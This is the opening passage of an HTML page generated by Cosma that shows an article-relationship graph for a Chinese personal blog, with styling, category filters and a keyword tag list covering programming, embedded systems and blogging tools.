<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="generator" content="Cosma v2.4.0">
    
    <meta name="title" content="半方池水半方田 - 文章关系图谱">
    
    <meta name="author" content="wuanqin">
    
    <meta name="description" content="只能懂一点点">
    
    <meta name="keywords" content="编程,博客,生活">
    
    <meta name="date" content="August 4, 2024 at 11:59:51 PM">
    <title>Cosma — 半方池水半方田 - 文章关系图谱</title>

    <link rel="icon" type="image/png" sizes="16x16" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAIGaVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJYTVAgQ29yZSA2LjAuMCI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4xMDI0PC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjEwMjQ8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KokyVsAAAAAlwSFlzAAALEwAACxMBAJqcGAAAATtQTFRFR3BMDVJzDFx+GHSUAP//DVByCVd3AAAAAAD/AIKBCXKSBFJ0F1x/GFZ2EGCANmF8D2+QGHaXFG6NAFh8EnaXG3aWLHCOE2iIH3mZAEx4AFV6AG2QAXOUOn+dprG8AHGSGmuLGWmJfZqtUoahprrGD1V4CVV4FHeWFnWWLmeIAFp8FWaGAFh7LmeGF2OGUHWNfZapAF+HUHSNfZaoAF6H/////Pz87O7x4uLio6Oj3t7eFWaJE16DGGCEIWuOAFqAGoCiADxyAFyHRG+MHoGjAGeQE3GUEG6S1tvhAH2iRX+cAG2Y5OjrAGWMiqCxoa+7iqGyobXBB2KGCF6DCGGFCl2DE4CiEX2gGXqdEX2fFX+iJHmcGXqcInmbAEx3aIWa193jAE12Z4Sa5ensZ5CmaZCn1t3j5Ons3t7fp3RRZgAAADV0Uk5TAHRwQQFHRAEBAkJ4+3h0eHBudPpy+3V1cvv7+vpy+/v7+/v7+52dmZl1+nX6dXX7+/v7+/siYXfnAAAA2ElEQVQYGQXBy07CUBRA0X1OD9zCQAloS4Nj40ii/gG/7UdoSYwxjowCgo9EQxrpfdS1wA0AAGDgEHcgO8qshw/xN+IscnG9tp6SfCjqp2hheHXrMhO6EB8Wr43Rz/qX2fSe+TbW0m8MlepMdvBVxCJTDHv/vkNulqs3fnaGIpJmqnWnOksiKKVIAoAkcoLR+fEGMWK3OfYJ5SWsJ2XlfVVOtmGFso+tP53AaOzbuMewqt4+Tj9pP0aH0lrJ/87nG1Elpa5cPufiDvTCUJWUGvM4cDkAAOSOf+M3WO+ZgJOzAAAAAElFTkSuQmCC" />

    <style> 
        :root {
            
            --n_archive: #4d3300;
            
            --n_博客相关: #05837b;
            
            --n_核心协同: #84c227;
            
            --n_有感而发: #ff274a;
            
            --n_工具箱: #af6f18;
            
            --n_社会生活: #858585;
            
            --n_hexo: #4095a5;
            
            --n_wordpress: #48565c;
            
            --n_嵌入式: #0c48a6;
            
            --n_数学与算法: #3e3854;
            
            --n_undefined: #d1d1d1;
            
            
            --l_undefined: #e1e1e1;
            
            --highlight: #ff6a6a;
        }
        @charset "UTF-8";

/** Global
------------------------------------------------------------*/

:root {
  /* colors */
  --cosma-blue: #147899;
  --cosma-blue-dark: #02385c;
  --border-color: #d8d8d8;
  --border-light-color: #f3f3f3;
  --indicator-background-color: #fafafa;
  --lateral-background-color: white;
  /* typography */
  --sans: system-ui, -apple-system, 'San Francisco', 'Helvetica Neue', 'Segoe UI', 'Arial',
    sans-serif;
  --serif: 'Georgia', 'Garamond', 'Time New Roman', 'Times', serif;
  --mono: 'Consolas', 'Courrier New', 'Courrier', monospace;
  --condensed: 'Avenir Next Condensed', 'Arial Condensed', sans-serif;
  /* global size */
  font-size: 62.5%;
  /* others */
  --shadow: 0 1px 3px rgba(3, 2, 2, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
  --offblack: rgb(51, 51, 51);
  --offwhite: rgb(253, 252, 251);
  --gray: #d6d6d6;
  --background-gray: rgb(246, 246, 246);
}

* {
  box-sizing: border-box;
}

/** Page
------------------------------------------------------------*/

body {
  display: flex;
  overflow: hidden;
  width: 100%;
  margin: 0;
  padding: 0;
  font-family: var(--sans);
  font-size: 1.4rem;
}

/* ---
- Containers
--- */

article {
  padding: 0.8rem 0;
}

article + article:not(.record) {
  border-top: 1px solid var(--border-light-color);
}

/** Elements
------------------------------------------------------------*/

a {
  text-decoration: none;
}

/* ---
- Buttons
--- */

button {
  cursor: pointer;
  margin: 0.5rem 0.2rem;
  font-size: 1.3rem;
}

.btn {
  background-color: white;
  border: 1px solid var(--border-color);
  border-radius: 2px;
}

.btn.active,
.btn[data-active='true'] {
  border: 1px solid black;
}

[onclick] {
  cursor: pointer;
}

/* ---
- Inputs
--- */

.outline {
  outline: var(--cosma-blue) solid 1px;
}

label {
  cursor: pointer;
}

input {
  font-size: 1.3rem;
}

input[type='checkbox'] {
  cursor: pointer;
  width: 1.2rem;
  height: 1.2rem;
  margin: 0 0.8rem 0 0;
}

input[type='range'] {
  cursor: pointer;
  width: 100%;
  margin-top: 0.3rem;
}

/* ---
- Lists
--- */

details {
  padding: 0.5rem 0 1rem 0;
}

details[data-sort] .sort-box:not(.active) {
  display: none;
}

details > summary {
  cursor: pointer;
  text-transform: uppercase;
  font-size: 1.3rem;
  margin: 1rem 0 0.5rem 0;
  font-weight: bold;
  outline: none;
}

summary + button {
  margin: 1rem 0;
}

.list-content-container ul {
  list-style: none;
  margin: 0;
  padding: 0;
}

.list-content-container ul li {
  padding: 0.3rem 0 0.3rem 1rem;
}

.list-content-container .menu-controls-list {
  margin-top: 1.3rem;
}

.list-content-container ul li span:last-of-type:not(.badge) {
  line-height: 1.5;
}

.record-type-points {
  /* colored dot before links */
  font-size: 0.8em;
  padding-right: 0.8em;
}

.menu-controls-container p:first-child {
  font-weight: bold;
}

.menu-types-container {
  display: flex;
  flex-direction: column;
}

.filter {
  margin: 0.1em 0;
}

.menu-tags-container {
  display: flex;
  flex-wrap: wrap;
  margin-top: 1em;
}

.menu-tags-container label {
  display: flex;
  align-items: center;
  margin: 0.15em 0.15em 0.15em 0;
}

.menu-tags-container .label {
  margin: 0 0.2em;
}

.menu-tags-container .badge {
  margin: 0.15em 0.15em 0.15em 0;
}

.menu-tags-container input[type='checkbox'] {
  margin: 0.2em;
}

.menu-index-list {
  display: flex;
  flex-direction: column;
}

.menu-index-list.reverse {
  flex-direction: column-reverse;
}

/* ---
- Texts
--- */

a {
  color: inherit;
}

code {
  font-family: var(--mono);
}

/* ---
- Tips
--- */

.badge {
  display: inline-block;
  background-color: var(--indicator-background-color);
  border: 1px solid var(--gray);
  border-radius: 1px;
  padding: 0 0.3rem;
  font-size: 1rem;
  margin-left: 0.2rem;
  text-align: center;
  line-height: 1.5rem;
  white-space: nowrap;
  font-family: var(--mono);
  color: black;
}

.tooltip {
  cursor: pointer;
  position: relative;
  display: inline-block;
  background-color: var(--cosma-blue);
  border-radius: 50%;
  color: white;
  width: 16px;
  text-align: center;
  height: 16px;
  font-weight: normal;
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 120px;
  line-height: 130%;
  background-color: var(--cosma-blue-dark);
  box-shadow: var(--shadow);
  text-align: center;
  padding: 5px;
  border-radius: 2px;
  position: absolute;
  z-index: 1;
  width: 160px;
  bottom: 130%;
  left: 50%;
  margin-left: -80px;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
}

/** Menu (left side board)
------------------------------------------------------------*/

aside.menu {
  box-shadow: var(--shadow);
  z-index: 100;
  overflow: auto;
  height: 100vh;
  flex: 0 0 30rem;
  margin: 0;
  padding: 0 20px 50px 20px;
  background-color: var(--background-gray);
  color: var(--offblack);
}

aside.menu:not(.active) {
  display: none;
}

/* ---
- User title
--- */

.title {
  text-transform: uppercase;
  font-size: 1.8rem;
  color: var(--cosma-blue-dark);
  text-align: center;
}

/* ---
- Toolbar
--- */

#menu-electron {
  display: flex;
  flex-direction: row;
  justify-content: space-evenly;
  align-items: center;
  margin-top: 1.5rem;
}

#menu-electron button {
  padding: 0;
  margin: 0;
  background-color: transparent;
  border: none;
}

#menu-electron button + button {
  margin-left: 7px;
}

#menu-electron button svg {
  height: 25px;
  width: auto;
}

#menu-electron button.icon-chevron svg {
  height: 18px;
}

/* ---
- Spatialization load bar
--- */

.load-bar {
  height: 0.3em;
  padding: 0.1rem;
  display: flex;
  margin: 1rem 0;
  background-color: var(--indicator-background-color);
}

.load-bar #load-bar-value {
  background-color: var(--cosma-blue);
  flex-basis: 100%;
}

/* ---
- Search input & list
--- */

.search-bar {
  width: 100%;
  margin: 0.8rem 0;
}

#search-result-list {
  margin-bottom: 0.8rem;
}

#search-result-list li {
  cursor: pointer;
}

/* ---
- Controls from graph params
--- */

.menu-controls input[type='number'] {
  width: 7rem;
  margin-left: 1rem;
}

.menu-controls-title {
  font-weight: bold;
}

/* ---
- Footer
--- */

aside.menu footer {
  display: flex;
  justify-content: space-evenly;
  position: fixed;
  bottom: 0px;
  left: 0px;
  width: 30rem;
  margin-top: 1.8rem;
  background-color: inherit;
  padding: 0.8rem 0 0.8rem 0.8rem;
  text-transform: uppercase;
  border-top: solid 1px var(--border-color);
  font-size: 1.1rem;
  text-align: center;
}

aside.menu footer span:not(:first-of-type)::before {
  content: '—';
}

/** Record container (right side board)
------------------------------------------------------------*/

main.record-container {
  z-index: 100;
  top: 0;
  right: 0;
  padding: 1rem 2rem;
  flex: 0 0 50rem;
  height: 100vh;
  overflow: auto;
  background-color: var(--offwhite);
  color: var(--offblack);
  box-shadow: var(--shadow);
}

main.record-container:not(.active) {
  display: none;
}

.empty-record {
  margin-top: 4rem;
}

.empty-record p {
  font-size: 1.8rem;
}

.record:not(.active) {
  display: none;
}

/* ---
- Record header
--- */

.record header {
  padding-bottom: 1.5rem;
  margin-bottom: 3rem;
  border-bottom: 1px solid var(--gray);
}

.record header div + div,
.record-focus-container {
  margin-top: 0.8rem;
}

.record header div span:first-of-type,
.record-focus-container > span {
  font-size: 1.3rem;
  font-weight: bold;
  text-transform: uppercase;
  margin-right: 0.8rem;
}

.record-last-edit {
  display: none;
}

.record-focus-lever {
  display: none;
}

.record-focus-lever input {
  width: 80%;
}

/* ---
- Record content
--- */

.record-content a {
  text-decoration: underline;
}

.record img {
  height: auto;
  max-width: 100%;
}

.record header img {
  height: auto;
  max-width: 100%;
  margin: 1rem 0;
}

/* From Typesafe.css, by Bradley Taunt */

.record main {
  font-size: 1.6rem;
  line-height: 1.5;
  font-family: var(--serif);
}

.record main h1,
h2,
h3,
h4,
h5,
h6 {
  font-family: var(--sans);
  margin: 3rem 0 0 0;
}

.record main h1 {
  font-size: 1.8rem;
}

.record main h2 {
  font-size: 1.6rem;
}

.record main h3 {
  font-size: 1.4rem;
}

.record main a {
  word-wrap: break-word;
}

.record main a.record-link {
  color: #337ab7;
}

a.record-link.highlight {
  font-style: normal;
  background-color: rgba(255, 255, 182, 1);
}

.record main ul,
.record main ol {
  padding-left: 2rem;
}

.record main ul li,
.record ol li {
  margin: 0.5rem 0 0 0;
}

.record main pre {
  overflow: auto;
  font-size: 90%;
}

.record main blockquote {
  border-left: 5px solid var(--border-color);
  margin: 0;
  padding-left: 1rem;
}

.record main table {
  border-collapse: collapse;
  margin: 2rem 0;
  text-align: left;
  width: 100%;
}

.record main tr {
  border-bottom: 1px solid var(--border-color);
}

.record main th,
.record main td {
  padding: 0.5rem;
}

.record main hr {
  background: var(--border-color);
  border: 0;
  height: 1px;
  margin: 2rem 0;
}

/* ---
- Record bibliography
--- */

.record .bibliography div + div {
  margin-top: 1rem;
}

.record div.csl-entry {
  width: inherit;
  text-indent: -2rem;
  padding-left: 2rem;
  margin: 0.75rem 0 0 0;
  line-height: 1.3;
  overflow-wrap: break-word;
  word-wrap: break-word;
  -ms-word-break: break-all;
  word-break: break-word;
}

/* ---
- Record footer
--- */

.record footer {
  margin-top: 3rem;
  border-top: 1px solid var(--gray);
}

.record footer li {
  /* links & backlinks */
  position: relative;
}

.record footer li .record-links-context {
  background: white;
  padding: 0.8rem;
  border-radius: 2px;
  margin-top: 0.8rem;
  bottom: calc(100% + 10px);
  box-shadow: var(--shadow);
  text-indent: 0;
}

.record footer li .record-links-context.hover {
  position: absolute;
  display: none;
}

.record footer li:hover .record-links-context.hover {
  display: block;
}

.record footer li .record-links-context li::before {
  content: '-';
  position: relative;
  left: -5px;
}

.record footer li .record-links-context p,
.record footer li .record-links-context blockquote {
  margin: 0px;
}

.record footer li .record-links-context p + p {
  margin-top: 0.8rem;
}

/** Graph
------------------------------------------------------------*/

.graph-wrapper {
  top: 0;
  right: 0;
  height: 100vh;
  flex: 1;
}

#graph-canvas {
  cursor: move;
  width: 100%;
  height: 100%;
}

/* ---
- Graph elements
--- */

/* nodes */
circle,
text {
  cursor: pointer;
}

g.focus circle {
  stroke: var(--highlight);
}

/* labels */
text {
  font-family: var(--condensed);
  fill: gray;
}

/* arrows */
marker {
  /* set into config.yml file by 'undefined' link type */
  stroke: var(--l_undefined);
  fill: var(--l_undefined);
}

/* ---
- Buttons
--- */

.graph-controls-section + .graph-controls-section {
  margin-top: 10px;
}

.graph-control-label {
  margin-bottom: 5px;
}

.graph-controls {
  position: fixed;
  left: 34rem;
  display: flex;
  align-items: flex-start;
  flex-direction: column;
  bottom: 55px;
}

.graph-controls.move {
  left: 4rem;
}

.graph-timeline {
  position: absolute;
  display: flex;
  align-items: flex-start;
  flex-direction: column;
}

.graph-controls div {
  position: relative;
}

.graph-controls div.graph-controls-zoom {
  display: flex;
  justify-content: space-between;
  position: relative;
}

.graph-controls-focus {
  display: flex;
  justify-content: flex-start;
  flex-flow: row wrap;
}

.graph-controls-focus input[type='range']:not(.active) {
  display: none;
}

.graph-controls #reset-isolate {
  display: none;
}

.graph-controls #reset-highlight {
  display: none;
}

#timeline-form {
  width: calc(100vw - 850px);
  backdrop-filter: blur(7px);
}

#timeline-form:not(.active) {
  display: none;
}

#timeline-form input[type='range'] {
  width: 100%;
}

#timeline-range output[name='timeline_output'] {
  color: gray;
  position: relative;
  text-align: center;
}

#chonos-list {
  display: flex;
  color: gray;
  justify-content: space-between;
}

/* thanks to https://stackoverflow.com/a/62983699/13491646 */

input[type='range'] + datalist {
  display: block;
  margin-top: -4px;
}

input[type='range'] + datalist option {
  cursor: pointer;
  display: inline-block;
  width: calc((100% - 12px) / (var(--list-length) - 1));
  text-align: center;
  font-size: 11px;
  color: gray;
}

input[type='range'] + datalist option:first-child {
  width: calc((100% - 12px) / ((var(--list-length) - 1) * 2) + 6px);
  text-align: left;
}

input[type='range'] + datalist option:last-child {
  width: calc((100% - 12px) / ((var(--list-length) - 1) * 2) + 6px);
  text-align: right;
}

/** Credits
------------------------------------------------------------*/

article#credits {
  text-align: center;
}

article#credits ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
}

article#credits dt {
  font-weight: bold;
}

article#credits dd,
article#credits li {
  margin: 0;
  padding: 0 0 0.5rem 0;
}

article#credits h1.metas-title {
  font-size: 2rem;
}

/* ---
- Logo
--- */

.logo {
  cursor: pointer;
}

.logo svg {
  display: block;
  margin: 0 auto;
  max-width: 300px;
}

@keyframes rotate-center {
  0% {
    transform: rotate(0deg);
  }

  50% {
    transform: rotate(270deg);
  }

  100% {
    transform: rotate(360deg);
  }
}

#cosma-roll {
  transform-origin: 96px 42px;
}

#cosma-roll.anim {
  animation: 3s cubic-bezier(0.2, -0.2, 0.8, 1) 1 rotate-center;
}

/** Help
------------------------------------------------------------*/

#help td:first-child {
  font-weight: bold;
  text-align: right;
}

#help td {
  vertical-align: top;
}

#help tr {
  border-top: 1px solid var(--border-color);
  border-bottom: 1px solid var(--border-color);
}

/** Bibliography references
------------------------------------------------------------*/

#citation-references button {
  margin-bottom: 2rem;
}

#citation-references code {
  display: block;
  word-wrap: break-word;
  font-size: 1.2rem;
  max-height: 75vh;
  overflow: scroll;
  border-top: 1px solid var(--border-color);
  border-bottom: 1px solid var(--border-color);
}

.close-button {
  position: absolute;
  top: 5px;
  z-index: 200;
  padding: 1px 5px 4px 4px;
}

.close-button.active {
  transform: scaleX(-1);
}

.close-button.right {
  right: 10px;
  text-orientation: upright;
}

.close-button.left {
  left: 10px;
}

        @media print {
  /* ---
	- Global
	--- */

  :root {
    font-size: 52.5%;
  }

  @page {
    margin: 10mm 20mm;
  }

  body {
    overflow: unset;
  }

  /* ---
	- Elements
	--- */

  p,
  tr,
  li {
    orphans: 3;
  }

  a[href]:not([onclick]):after {
    content: ' (' attr(href) ')';
  }

  /* ---
	- Page containers
	--- */

  aside,
  .graph-wrapper {
    display: none;
  }

  /* ---
	- Record header
	--- */

  .record header {
    margin-bottom: 10mm;
  }

  .record-focus-container,
  .record-btn-close {
    display: none;
  }

  /* ---
	- Record main
	--- */

  main.record-container {
    position: unset;
    width: 100%;
    overflow: unset;
    box-shadow: unset;
  }

  /* ---
	- Record footer
	--- */

  main.record-container footer {
    break-before: page;
  }

  main.record-container footer .record-links-context {
    display: block;
    position: unset;
    box-shadow: unset;
  }

  main.record-container footer li {
    display: block;
    margin-top: 2mm;
  }

  .id-context {
    font-style: normal;
    text-decoration: underline;
  }
}


        
    </style>
</head>

<body>

    <button id="close-left-side" class="close-button left">❮</button>
    <button id="close-right-side" class="close-button right">❮</button>

    

    <aside id="menu-container" class="menu active list-content-container">
        <header role="banner">
            
            <h1 class="title">半方池水半方田 - 文章关系图谱</h1>
            

            <div class="load-bar" onclick="updateForces()"
                title="Spatialization (Space)">
                <div id="load-bar-value"></div>
            </div>
        </header>

        <section>
            <input class="search-bar" id="search" placeholder="Search… (S)"
                autocomplete="off" role="search" />
            <ul id="search-result-list"></ul>
        </section>

        <details class="menu-types" open="open">
            <summary class="menu-title">
                Types
                <span id="types-counter" class="badge">0</span>
            </summary>

            <form id="types-form" class="menu-types-container">
                
                <label class="filter">
                    <input type="checkbox" name="undefined">
                    <span class="label" style="color: var(--n_undefined);">undefined</span>
                    <span class="badge">52</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="嵌入式">
                    <span class="label" style="color: var(--n_嵌入式);">嵌入式</span>
                    <span class="badge">16</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="数学与算法">
                    <span class="label" style="color: var(--n_数学与算法);">数学与算法</span>
                    <span class="badge">3</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="有感而发">
                    <span class="label" style="color: var(--n_有感而发);">有感而发</span>
                    <span class="badge">11</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="工具箱">
                    <span class="label" style="color: var(--n_工具箱);">工具箱</span>
                    <span class="badge">27</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="核心协同">
                    <span class="label" style="color: var(--n_核心协同);">核心协同</span>
                    <span class="badge">18</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="博客相关">
                    <span class="label" style="color: var(--n_博客相关);">博客相关</span>
                    <span class="badge">28</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="Hexo">
                    <span class="label" style="color: var(--n_hexo);">Hexo</span>
                    <span class="badge">17</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="Archive">
                    <span class="label" style="color: var(--n_archive);">Archive</span>
                    <span class="badge">7</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="WordPress">
                    <span class="label" style="color: var(--n_wordpress);">WordPress</span>
                    <span class="badge">9</span>
                </label>
                
                <label class="filter">
                    <input type="checkbox" name="社会生活">
                    <span class="label" style="color: var(--n_社会生活);">社会生活</span>
                    <span class="badge">2</span>
                </label>
                
            </form>
        </details>

        
        <details class="menu-tags" data-sort="tag">
            <summary class="menu-title">
                Keywords
                <span id="tag-counter" class="badge">284</span>
            </summary>

            <select class="sorting-select" name="index_sorting">
                <option value="alphabetical">A-Z</option>
                <option value="alphabetical:reverse">Z-A</option>
                <option value="digital">Croissant</option>
                <option value="digital:reverse">Décroissant</option>
            </select>

            <form id="tags-form" class="menu-tags-container menu-tags-container-prim sort-box active">
                
                <label class="btn" style="order: 1">
                    <input type="checkbox" name="Navicat">
                    <span class="label">Navicat</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 2">
                    <input type="checkbox" name="禅道">
                    <span class="label">禅道</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 3">
                    <input type="checkbox" name="嵌入式">
                    <span class="label">嵌入式</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 4">
                    <input type="checkbox" name="笔记">
                    <span class="label">笔记</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 5">
                    <input type="checkbox" name="多媒体">
                    <span class="label">多媒体</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 6">
                    <input type="checkbox" name="MP3">
                    <span class="label">MP3</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 7">
                    <input type="checkbox" name="AVC">
                    <span class="label">AVC</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 8">
                    <input type="checkbox" name="010编辑器">
                    <span class="label">010编辑器</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 9">
                    <input type="checkbox" name="JPEG">
                    <span class="label">JPEG</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 10">
                    <input type="checkbox" name="WAV">
                    <span class="label">WAV</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 11">
                    <input type="checkbox" name="AVI">
                    <span class="label">AVI</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 12">
                    <input type="checkbox" name="BMP">
                    <span class="label">BMP</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 13">
                    <input type="checkbox" name="DCT">
                    <span class="label">DCT</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 14">
                    <input type="checkbox" name="命题逻辑">
                    <span class="label">命题逻辑</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 15">
                    <input type="checkbox" name="面试">
                    <span class="label">面试</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 16">
                    <input type="checkbox" name="总结">
                    <span class="label">总结</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 17">
                    <input type="checkbox" name="Deb包">
                    <span class="label">Deb包</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 18">
                    <input type="checkbox" name="Kylin">
                    <span class="label">Kylin</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 19">
                    <input type="checkbox" name="pyinstaller">
                    <span class="label">pyinstaller</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 20">
                    <input type="checkbox" name="PyQt">
                    <span class="label">PyQt</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 21">
                    <input type="checkbox" name="编译">
                    <span class="label">编译</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 22">
                    <input type="checkbox" name="CSV">
                    <span class="label">CSV</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 23">
                    <input type="checkbox" name="lxml">
                    <span class="label">lxml</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 24">
                    <input type="checkbox" name="OLE">
                    <span class="label">OLE</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 25">
                    <input type="checkbox" name="Word">
                    <span class="label">Word</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 26">
                    <input type="checkbox" name="XML">
                    <span class="label">XML</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 27">
                    <input type="checkbox" name="CClose">
                    <span class="label">CClose</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 28">
                    <input type="checkbox" name="快捷键">
                    <span class="label">快捷键</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 29">
                    <input type="checkbox" name="鼠标">
                    <span class="label">鼠标</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 30">
                    <input type="checkbox" name="AutoHotKey">
                    <span class="label">AutoHotKey</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 31">
                    <input type="checkbox" name="前端">
                    <span class="label">前端</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 32">
                    <input type="checkbox" name="Ant Design">
                    <span class="label">Ant Design</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 33">
                    <input type="checkbox" name="umijs">
                    <span class="label">umijs</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 34">
                    <input type="checkbox" name="yarn">
                    <span class="label">yarn</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 35">
                    <input type="checkbox" name="cnpm">
                    <span class="label">cnpm</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 36">
                    <input type="checkbox" name="tyarn">
                    <span class="label">tyarn</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 37">
                    <input type="checkbox" name="蚂蚁金服">
                    <span class="label">蚂蚁金服</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 38">
                    <input type="checkbox" name="React">
                    <span class="label">React</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 39">
                    <input type="checkbox" name="Pug">
                    <span class="label">Pug</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 40">
                    <input type="checkbox" name="Cosma">
                    <span class="label">Cosma</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 41">
                    <input type="checkbox" name="项目">
                    <span class="label">项目</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 42">
                    <input type="checkbox" name="malloc">
                    <span class="label">malloc</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 43">
                    <input type="checkbox" name="内存分配">
                    <span class="label">内存分配</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 44">
                    <input type="checkbox" name="Epic">
                    <span class="label">Epic</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 45">
                    <input type="checkbox" name="DLC">
                    <span class="label">DLC</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 46">
                    <input type="checkbox" name="Mod">
                    <span class="label">Mod</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 47">
                    <input type="checkbox" name="Steam">
                    <span class="label">Steam</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 48">
                    <input type="checkbox" name="UST-TTL">
                    <span class="label">UST-TTL</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 49">
                    <input type="checkbox" name="物联网">
                    <span class="label">物联网</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 50">
                    <input type="checkbox" name="WIFI">
                    <span class="label">WIFI</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 51">
                    <input type="checkbox" name="git">
                    <span class="label">git</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 52">
                    <input type="checkbox" name="Git">
                    <span class="label">Git</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 53">
                    <input type="checkbox" name="Gitee">
                    <span class="label">Gitee</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 54">
                    <input type="checkbox" name="cqhttp">
                    <span class="label">cqhttp</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 55">
                    <input type="checkbox" name="ButterFly">
                    <span class="label">ButterFly</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 56">
                    <input type="checkbox" name="cmd">
                    <span class="label">cmd</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 57">
                    <input type="checkbox" name="plugin">
                    <span class="label">plugin</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 58">
                    <input type="checkbox" name="JMeter">
                    <span class="label">JMeter</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 59">
                    <input type="checkbox" name="C++">
                    <span class="label">C++</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 60">
                    <input type="checkbox" name="Cron">
                    <span class="label">Cron</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 61">
                    <input type="checkbox" name="crontab">
                    <span class="label">crontab</span>
                    <span class="badge">1</span>
                </label>
                
                <label class="btn" style="order: 62">
                    <input type="checkbox" name="linux">
